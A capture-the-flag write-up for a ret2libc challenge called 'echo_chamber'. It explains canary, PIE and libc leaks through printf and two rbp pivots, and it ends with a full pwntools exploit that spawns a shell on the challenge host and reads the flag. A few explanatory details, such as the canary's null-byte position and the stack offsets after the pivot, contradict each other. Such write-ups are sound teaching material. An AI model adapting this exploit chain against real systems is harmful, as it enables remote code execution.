# echo_chamber — pwn writeup

## Challenge

```c
// echo_chamber - hard ret2libc
// gcc -O0 -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -o echo_chamber echo_chamber.c
static void chamber(void) {
    char buf[0x50];
    puts("The chamber listens. Say 'bye' to leave.");
    for (;;) {
        printf("> ");
        read(0, buf, 0x70);
        if (strncmp(buf, "bye", 3) == 0)
            break;
        printf("echo: %s\n", buf);
    }
}
```

**Mitigations:** full RELRO, PIE, stack canary, NX.
**No libc is provided**; we must leak it from the process itself.

---

## 1. Analysis

### 1.1 The overflow

`read(0, buf, 0x70)` writes 0x70 bytes into a 0x50-byte stack buffer.
Stack layout inside `chamber`:

```
buf         = rbp - 0x60
canary      = rbp - 0x08     (= buf + 0x58)
saved RBP   = rbp            (= buf + 0x60)
saved RIP   = rbp + 0x08     (= buf + 0x68)
```

So we get **0x20 bytes of overflow**:

| offset in `buf` | what                     |
|-----------------|--------------------------|
| `0x00 – 0x4f`   | buffer                   |
| `0x50 – 0x57`   | padding                  |
| `0x58 – 0x5f`   | canary                   |
| `0x60 – 0x67`   | saved RBP                |
| `0x68 – 0x6f`   | saved RIP (**only 1 qword!**) |

Only **one controlled return address** — not enough for a normal ROP chain. Every multi-step plan has to pivot.

### 1.2 The leak oracle — `printf("echo: %s", buf)`

The `printf("%s", buf)` call uses `buf` directly as a C-string.
`printf` stops at the first `\x00`. Any *real* canary starts with `\x00` by design — so a naive "send 0x59 A's" leaks nothing useful.

The trick is to **overwrite the canary's low byte with a non-null byte** before echoing. Now `printf` runs past the canary and lets us leak whatever sits behind it. Only the final iteration that we `return` from has to restore the real canary — the canary check only fires at `leave; ret`, so a bad canary in a non-returning iteration is harmless.

This gives us three leak primitives:

- **Canary**: send `A*0x59`. Printf echoes 0x59 A's + 7 leaked canary bytes (stops at canary's high `\x00` — canary is `XX XX XX XX XX XX XX 00` — the *first* zero is at the end, so 7 bytes leak, then we reconstruct as `\x00 + leak`).
- **Saved RBP (MR)**: send `A*0x58 + bad_canary` (bad = `\x01 + canary[1:]`). Printf passes the canary and continues into saved RBP; only the two high bytes are `\x00`, so we get 6 bytes.
- **PIE**: send `A*0x58 + bad_canary + 'A'*8`. Overwriting saved RBP with `0x41` bytes makes Printf continue into saved RIP at `[MR-0x08]`. We recover the (corrupted) saved RBP in the pivot iteration, so this is safe.

### 1.3 Gadget inventory

Rebuilding with `-O0` and glibc 2.35 (Ubuntu 22.04) yields a gadget-poor binary:

```
ROPgadget --binary echo_chamber | grep -E "pop rdi|pop rsi|pop rdx|pop rbx"
# ...nothing useful
```

- No `pop rdi; ret` — SysV x86-64 uses registers for arguments, so the compiler never emits this.
- No `__libc_csu_init` pop chain — glibc 2.34+ removed it.

What **is** present:

```
0x1365 : leave ; ret
0x101a : ret
0x11f3 : pop rbp ; ret
0x1016 : add rsp, 8 ; ret
```

Just `leave; ret` and `ret` is enough — because `read` writes into `buf` at `rbp - 0x60` and we control `rbp` through the saved RBP field.

### 1.4 The `printf_echo` location (found via disasm)

The compiled `printf("echo: %s\n", buf)` code sits at `chamber + 0x73` = `0x1332`:

```
1332:  48 8d 45 a0             lea  rax, [rbp - 0x60]
1336:  48 89 c6                mov  rsi, rax
1339:  48 8d 05 88 0d 00 00    lea  rax, [rip + 0xd88]     # "echo: %s\n"
1340:  48 89 c7                mov  rdi, rax
1343:  b8 00 00 00 00          mov  eax, 0
1348:  e8 93 fd ff ff          call printf@plt
134d:  eb 9a                   jmp  0x12e9               # back to the loop
```

Jumping to `0x1332` with a chosen `rbp` turns the vulnerable binary into a **`printf("%s", *(rbp - 0x60))` gadget** — no `pop rdi` required. This is the entire trick of the exploit.

---

## 2. The exploit

Three phases.

### Phase 0 — leak canary, MR, PIE

```python
def leak_canary():
    prompt(); io.send(b"A" * 0x59)
    io.recvuntil(b"echo: ")
    d = io.recvn(0x60); io.recvuntil(b"\n")
    return b"\x00" + d[0x59:0x60]           # 7 leaked bytes -> 8-byte canary

def leak_MR(canary):
    bad = b"\x01" + canary[1:]              # bad byte 0 -> printf survives
    prompt(); io.send(b"A" * 0x58 + bad)
    io.recvuntil(b"echo: ")
    d = io.recvn(0x66); io.recvuntil(b"\n")
    return u64(d[0x60:0x66].ljust(8, b"\x00"))

def leak_PIE(canary):
    bad = b"\x01" + canary[1:]
    prompt(); io.send(b"A" * 0x58 + bad + b"\x41" * 8)     # 0x41-bytes extend past saved RBP
    io.recvuntil(b"echo: ")
    d = io.recvn(0x6e); io.recvuntil(b"\n")
    return u64(d[0x68:0x6e].ljust(8, b"\x00"))             # saved RIP into main
```

```
MR      = leaked saved RBP
buf     = MR - 0x70
main_ret_off = <the offset after "call chamber" in main> (found statically)
pie     = leaked_rip - main_ret_off
```

### Phase 1 — pivot #1: leak a libc pointer from `[MR+8]`

`main` has no locals, so `main`'s frame looks like:

```
[MR+0x00] = main's saved RBP   (belongs to __libc_start_call_main's caller)
[MR+0x08] = main's saved RIP   (return into __libc_start_call_main)
```

If we set `saved_rbp = MR+0x68`, then on the epilogue's `leave; ret` we'll have `rbp = MR+0x68` and `rip = printf_echo`. The compiled code immediately does `lea rax, [rbp - 0x60]` → `rax = MR+0x08`. `printf("%s", *(MR+8))` fires and leaks a libc pointer.

```python
payload1  = (b"bye\x00").ljust(0x58, b"A") + canary
payload1 += p64(MR + 0x68)      # saved RBP
payload1 += p64(pie + 0x1332)   # saved RIP = printf_echo
```

Then `printf_echo` ends with `jmp loop` → back to `printf("> "); read(0, buf, 0x70)` — but now `buf = rbp - 0x60 = MR + 8`. **The loop's read is now an arbitrary write into `[MR+8]`.**

`libc_base = libc_ret - 0x29d90` (Ubuntu 22.04 glibc 2.35 return offset in `__libc_start_call_main`).

### Phase 2 — pivot #2: `system("/bin/sh")`

Send a second payload of 0x70 bytes. This lands at `MR+8`:

| offset from `MR+8` | contents                            |
|--------------------|-------------------------------------|
| `0x00`             | `"bye\0"` → break the loop          |
| `0x08`             | dummy qword (popped by 2nd `leave`) |
| `0x10`             | `pop_rdi; ret` (from libc)          |
| `0x18`             | `/bin/sh` pointer                   |
| `0x20–0x30`        | three `ret` aligners                |
| `0x38`             | `system`                            |
| `0x58`             | canary                              |
| `0x60`             | saved RBP for 2nd leave = `MR+0x10` |
| `0x68`             | saved RIP for 2nd leave = `leave_ret` |

On break, the epilogue's canary check passes (real canary restored).
`leave`: `rsp = rbp` → `rsp = MR+0x60`, `rbp = [MR+0x60] = MR+0x10`, `rip = [MR+0x68] = leave_ret`.
Second `leave;ret`: `rsp = MR+0x20`, `rbp = [MR+0x10] = pop_rdi`, `rip = [MR+0x18] = MR+0x18`'s value → first chain gadget (`pop_rdi`).

The chain then executes:

```
pop_rdi ; binsh ; ret ; ret ; ret ; system
```

**Why three `ret` aligners?** `MR ≡ 0 (mod 16)` (verified from a leak). After the second pivot's `leave; ret`, `rsp = MR + 0x30`. Three `ret`s push it to `MR + 0x48 ≡ 8 (mod 16)` — exactly the SysV ABI's required stack state at a function entry. Without them, `system` crashes inside `do_system`'s `movaps`.

---

## 3. Bugs I hit and how they were fixed

Getting this to actually shell out was not a straight line. Worth recording.

### 3.1 `NameError: i32` at the top

`i32` is not exported by `pwn import *` (pwntools only exports `p32`/`u32`). Fix:

```python
import struct
def i32(b): return struct.unpack("<i", b)[0]
```

### 3.2 `pop rdi; ret` not in binary

`ROP(elf).find_gadget(["pop rdi", "ret"])` returns `None`, and a raw byte-search for `\x5f\xc3` also returns `None`. The gadget simply does not exist in this binary. Solution: pivot-based leak + pivot-based chain (this writeup), using only `leave; ret` and libc's `pop rdi; ret` — which libc always has.

### 3.3 `objdump -d | sed -n '/<chamber>:/,/^$/p'` outputs nothing

Actually this is normal for stripped or oddly-linked binaries; the reliable workaround is `pwntools.disasm()` or `gdb -batch -ex "disassemble /r chamber"`. In our case, `disasm(elf.read(elf.symbols["chamber"], 0x200), vma=...)` showed us the exact instruction layout to hardcode `printf_echo_off = 0x1332`.

Also: `objdump -d | grep -A5 "echo: "` never works because `objdump` prints **addresses**, not string literals. You have to grep for `printf@plt` calls instead.

### 3.4 `printf_echo` auto-locate failure (`candidates = []`)

The finder expected `lea rdi, [rip+fmt]` (encoding `48 8d 3d`), but GCC actually emits `lea rax, [rip+fmt]; mov rdi, rax` (`48 8d 05`). The fix was to hardcode `printf_echo_off = 0x1332` from the manual disasm — the byte before `mov rsi, rax` (`48 89 c6`) where `lea rax, [rbp-0x60]` (`48 8d 45 a0`) lives.

### 3.5 `libc_base … not page-aligned`

The heuristic that walked `__libc_start_call_main` searching for `call *reg` matched **the wrong call** in glibc 2.35 (`call qword ptr [rbx+0x330]` at `0x29ede`, whose ret is `0x29ee4`, instead of the real `call rax` to `main` at `0x29d90`).

```
libc_ret   = 0x7fd4a7ff5d90
naive_off  = 0x29ee4       →  libc_ret − naive_off = …eac      (not aligned)
real_off   = 0x29d90       →  libc_ret − real_off  = …b000     (aligned)
```

There are ~23 calls in `__libc_start_call_main`, and only the correct one yields a 4 KB-aligned base. Two fixes tried:

1. **Enumerate every call, pick page-aligned one.** Worked, but `sym = 0x29dc0` was `__libc_start_main` (pwntools fell back), and the scan happened to match `sym + 0xfd0 = 0x2ad90`, which is `0x29d90 + 0x1000` (also page-aligned since libc is 4 KB-aligned).
2. **Hardcode `ret_off_libc = 0x29d90`.** Verified across three separate ASLR-re-randomized runs:

   | run | `libc_ret`         | `− 0x29d90`        |
   |-----|--------------------|--------------------|
   | 1   | `0x76db01273d90`   | `0x76db0124a000`   |
   | 2   | `0x7051ed811d90`   | `0x7051ed7e8000`   |
   | 3   | `0x7fd4a7ff5d90`   | `0x7fd4a7fcb000`   |

   All aligned. The offset is stable.

### 3.6 The shell died with `$` → EOF

The single most expensive bug. `pop_rdi` was built as:

```python
pop_rdi = libc_base + ROP(libc).find_gadget(["pop rdi", "ret"])[0]
```

But `ROP(libc).find_gadget(...)[0]` **already returns an absolute address** — because `libc.address = libc_base` was set a few lines earlier. So `pop_rdi = libc_base + (libc_base + 0x2a3e5)` = `0xffa94ffc03e5`. The chain's `pop rdi` jumped to unmapped memory, `rdi` was never set to `/bin/sh`, and `system` was called with the wrong argument — shell crashed instantly.

```python
# Wrong:
pop_rdi = libc_base + ROP(libc).find_gadget(["pop rdi", "ret"])[0]

# Right (auto-based after libc.address = libc_base):
pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
```

Note the second bug (#3.5) was silent: the "wrong" base `0x2ad90` was page-aligned relative to `libc_ret` because `0x2ad90 ≡ 0x29d90 (mod 0x1000)`, so it still yielded a valid `libc_base`. Only the `pop_rdi` double-base actually broke execution.

---

## 4. Alternative — one-gadget

`one_gadget libc.so.6` gave a candidate whose constraints are **automatically satisfied** after pivot #2:

```
0x50a40 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0x0
  rax == NULL || {"sh", rax, rbx, NULL} is a valid argv
  rbp == NULL || (u16)[rbp] == 0x0
```

- **`rsp ≡ 0 (mod 16)`**: after second `leave; ret`, `rsp = MR + 0x20`. `MR ≡ 0 (mod 16)`, so `rsp ≡ 0`. ✓
- **`rax == NULL`**: the canary check just before the epilogue is `mov rax, [rbp-8]; sub rax, fs:0x28; je ok`. On success `rax = 0`. Preserved through `leave; ret`. ✓
- **`rbp == NULL`**: we control what the second `leave`'s `pop rbp` loads — set it to 0. ✓

Payload becomes **one qword shorter** — no `pop_rdi`, no aligners:

```python
one_gadget = libc_base + 0x50a40

w = bytearray(0x70)
w[0x00:0x04] = b"bye\x00"
w[0x08:0x10] = p64(0)              # *(MR+0x10) → rbp = 0
w[0x10:0x18] = p64(one_gadget)     # *(MR+0x18) → rip
w[0x58:0x60] = canary
w[0x60:0x68] = p64(MR + 0x10)      # saved RBP for first leave
w[0x68:0x70] = p64(leave_ret)      # saved RIP for first leave
io.send(bytes(w))
```

Same pivot mechanics, tighter chain.

---

## 5. Full working exploit

```python
#!/usr/bin/env python3
import struct, time, sys
from pwn import *

context.binary = elf = ELF("./echo_chamber", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.arch = "amd64"

def i32(b): return struct.unpack("<i", b)[0]

HOST, PORT = "w05.ctf.chronos-security.ro", 32780

# ---------- binary gadgets ----------
leave_ret_off   = next(elf.search(b"\xc9\xc3"))
ret_off         = next(elf.search(b"\xc3"))
printf_echo_off = 0x1332     # from manual disasm of chamber
main_off, chamber_off = elf.symbols["main"], elf.symbols["chamber"]

mc = elf.read(main_off, 0x400)
main_ret_off = next(main_off + i + 5 for i in range(len(mc) - 4)
                    if mc[i] == 0xe8
                    and (main_off + i + 5 + i32(mc[i+1:i+5])) == chamber_off)

# ---------- connect ----------
io = remote(HOST, PORT)
def prompt(): io.recvuntil(b"> ")

def leak_canary():
    prompt(); io.send(b"A" * 0x59)
    io.recvuntil(b"echo: ")
    d = io.recvn(0x60); io.recvuntil(b"\n")
    return b"\x00" + d[0x59:0x60]

def leak_MR(canary):
    prompt(); io.send(b"A" * 0x58 + b"\x01" + canary[1:])
    io.recvuntil(b"echo: ")
    d = io.recvn(0x66); io.recvuntil(b"\n")
    return u64(d[0x60:0x66].ljust(8, b"\x00"))

def leak_PIE(canary):
    prompt(); io.send(b"A" * 0x58 + b"\x01" + canary[1:] + b"\x41" * 8)
    io.recvuntil(b"echo: ")
    d = io.recvn(0x6e); io.recvuntil(b"\n")
    return u64(d[0x68:0x6e].ljust(8, b"\x00"))

canary = leak_canary()
MR     = leak_MR(canary)
buf    = MR - 0x70
pie    = leak_PIE(canary) - main_ret_off

leave_ret   = pie + leave_ret_off
ret_gad     = pie + ret_off
printf_echo = pie + printf_echo_off

# ---------- pivot 1: printf_echo leaks *(MR+8) ----------
payload1  = (b"bye\x00").ljust(0x58, b"A") + canary
payload1 += p64(MR + 0x68)
payload1 += p64(printf_echo)

prompt(); io.send(payload1)
io.recvuntil(b"echo: ")
data = io.recvuntil(b"\n", drop=True)
io.recvuntil(b"> ")
if len(data) < 6:
    sys.exit("short libc leak — rerun")

libc_ret  = u64(data[:6].ljust(8, b"\x00"))
libc_base = libc_ret - 0x29d90            # Ubuntu 22.04 glibc 2.35
assert libc_base & 0xfff == 0

libc.address = libc_base
pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
system  = libc.symbols["system"]
binsh   = next(libc.search(b"/bin/sh"))

# ---------- pivot 2: system("/bin/sh") ----------
w = bytearray(0x70)
w[0x00:0x04] = b"bye\x00"
w[0x08:0x10] = p64(0xdeadbeefdeadbeef)
w[0x10:0x18] = p64(pop_rdi)
w[0x18:0x20] = p64(binsh)
w[0x20:0x28] = p64(ret_gad)
w[0x28:0x30] = p64(ret_gad)
w[0x30:0x38] = p64(ret_gad)
w[0x38:0x40] = p64(system)
w[0x58:0x60] = canary
w[0x60:0x68] = p64(MR + 0x10)
w[0x68:0x70] = p64(leave_ret)

io.send(bytes(w))
time.sleep(0.2)
io.sendline(b"id; cat flag*")
io.interactive()
```

---

## 6. Takeaway

Sometimes the primitive you need isn't a gadget — it's **an entire compiled function you can call with a chosen register state**. Here, `chamber`'s own `printf("echo: %s", buf)` instruction sequence is exactly a `printf`-of-arbitrary-pointer gadget, unlocked by pivoting `rbp`. Combined with the loop's implicit `read(0, rbp-0x60, 0x70)` (an implicit arbitrary-write), the whole exploit works without a single gadget from `echo_chamber` that touches `rdi`, `rsi`, or `rdx`.

Also worth remembering: **pwntools' `ROP(elf).find_gadget` uses capstone, which misses `pop rdi` at the same rate as `ROPgadget` does**. Both failed here because the gadget genuinely doesn't exist — not because of a tool bug. When a well-trodden gadget is missing, check whether the binary's own instructions can substitute. They often can.